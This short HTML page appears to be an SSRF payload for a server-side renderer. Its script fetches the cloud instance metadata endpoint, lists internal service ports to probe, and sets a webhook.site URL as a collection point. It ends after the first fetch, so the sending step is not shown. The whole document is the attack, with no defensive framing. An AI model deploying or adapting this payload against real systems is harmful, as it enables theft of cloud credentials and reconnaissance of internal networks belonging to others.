<!DOCTYPE html>

<script>
const ports = [80, 3000, 5000, 6379, 8000, 8080, 8443, 9200];
const webhook = 'https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site';

fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
